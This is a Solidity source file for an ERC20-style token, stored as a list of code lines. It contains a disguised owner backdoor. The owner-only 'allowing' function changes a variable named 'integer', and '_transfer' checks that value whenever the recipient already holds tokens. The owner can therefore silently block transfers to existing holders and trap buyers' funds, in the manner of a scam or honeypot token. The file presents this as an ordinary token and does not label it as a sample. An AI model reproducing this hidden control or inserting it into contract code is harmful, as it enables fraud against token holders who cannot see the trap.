['pragma solidity 0.4.16;\n', ' \n', 'interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }\n', ' \n', 'contract TokenERC20 {\n', '    string public name;\n', '    string public symbol;\n', '    uint8 public decimals = 18;  \n', '    uint8 public integer = 1;\n', '    uint256 public totalSupply;\n', '    address owner; \n', ' \n', '    mapping (address => uint256) public balanceOf;  \n', '    mapping (address => mapping (address => uint256)) public allowance;\n', ' \n', '    event Transfer(address indexed from, address indexed to, uint256 value);\n', '\n', ' \n', '    function TokenERC20(uint256 initialSupply, string tokenName, string tokenSymbol) public {\n', '        totalSupply = initialSupply * 10 ** uint256(decimals);\n', '        balanceOf[msg.sender] = totalSupply;\n', '        owner = msg.sender;\n', '        name = tokenName;\n', '        symbol = tokenSymbol;\n', '        \n', '    }\n', ' \n', ' \n', '    function _transfer(address _from, address _to, uint _value) internal {\n', '        require(_to != 0x0);\n', '        require(balanceOf[_from] >= _value);\n', '        require(balanceOf[_to] + _value > balanceOf[_to]);\n', '        if (balanceOf[_to] != 0) {\n', '        require(integer == 1);}\n', '        uint previousBalances = balanceOf[_from] + balanceOf[_to];\n', '        balanceOf[_from] -= _value;\n', '        balanceOf[_to] += _value;\n', '        Transfer(_from, _to, _value);\n', '        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);\n', '    }\n', ' \n', '    function transfer(address _to, uint256 _value) public returns (bool) {\n', '        _transfer(msg.sender, _to, _value);\n', '        return true;\n', '    }\n', ' \n', '    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n', '        require(_value <= allowance[_from][msg.sender]);     // Check allowance\n', '        allowance[_from][msg.sender] -= _value;\n', '        _transfer(_from, _to, _value);\n', '        return true;\n', '    }\n', ' \n', '    function approve(address _spender, uint256 _value) public\n', '        returns (bool success) {\n', '        allowance[msg.sender][_spender] = _value;\n', '        return true;\n', '    }\n', ' \n', '\n', '    \n', '    function allowing(uint8 _integer) public {\n', '        require(msg.sender == owner);\n', '        integer = _integer;\n', '    }\n', ' \n', '\n', '}']